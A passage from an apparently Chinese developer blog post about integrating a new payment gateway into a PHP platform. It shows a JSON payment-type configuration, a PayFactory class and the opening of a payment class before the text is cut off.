class=\"string\">\"网银H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WY_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">12</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网银快捷支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WY_KJ\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">13</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"京东钱包扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"JD\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">14</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"京东钱包WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"JD_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">15</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"京东钱包H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"JD_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">16</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"银联钱包扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"UN\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">17</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"银联钱包WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"UN_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">18</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"银联钱包H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"UN_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">19</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网关支付扫码\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"gateway\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">20</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信公众账号\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"weixinjsapi\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">21</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝服务窗支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"weixinjsapi\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">22</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝app支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"alipayapp\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">23</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"苏宁扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"suning\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;</span><br><span class=\"line\">\t        ],</span><br><span class=\"line\">        <span class=\"attr\">\"sort\"</span>: <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"nid\"</span>: <span class=\"string\">\"hua_yin_pay\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"华银\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantID\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPrivateKey\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPublicKey\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"platformPublicKey\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"payType\"</span>: [</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">1</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"weixin_scan\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">4</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"alipay_scan\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">7</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包宝扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"tenpay_scan\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">10</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网银支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"direct_pay\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>思路已经清晰了，直接从文件中添加了一个新的支付配置，果然后台支付列表中出现了，添加上该支付的配置参数</p>\n<ul>\n<li>添加后，发起支付，报无此支付方式的错误，直接在代码中搜索这个错误信息，找到这个<code>PayFactory.php</code>工厂类，部分代码如下</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by Kevin.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@author</span> kevin</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@copyright</span> HCHT 2017/9/15 17:06</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@description</span> 支付工厂类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\">include_cache(S_CORE . <span class=\"string\">'class'</span> . DS . <span class=\"string\">'pay'</span>  . DS . <span class=\"string\">'chengyi.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PayFactory</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInterface</span><span class=\"params\">($payMent)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> ($payMent) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'cheng_yi_pay'</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> cheng_yi_pay();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                ErrorCode::errorResponse(<span class=\"number\">200015</span>, <span class=\"string\">'线上支付方式不存在'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路已经很明朗了，创建一个支付类，添加上case分支</p>\n<ul>\n<li>随便打开一个支付类，根据它的部分逻辑，接入新的支付逻辑，处理异步回调时，发现有两个回调可供选择，一个在<code>recharge.php</code>中，一个在根目录下的<code>rechargeNotify.php</code>中，同步回调在根目录下<code>beeePayOk.php</code>，具体可阅读代码，没有必要张贴</li>\n</ul>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>具体的支付类代码，仅供参考，每个支付的具体实现都有差别</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@description</span> 诚意支付</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\">include_cache(S_CORE . <span class=\"string\">'class'</span> . DS . <span class=\"string\">'pay'</span> . DS . <span class=\"string\">'payinfo'</span> . <span class=\"string\">'.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ChengYiPay</span> <span 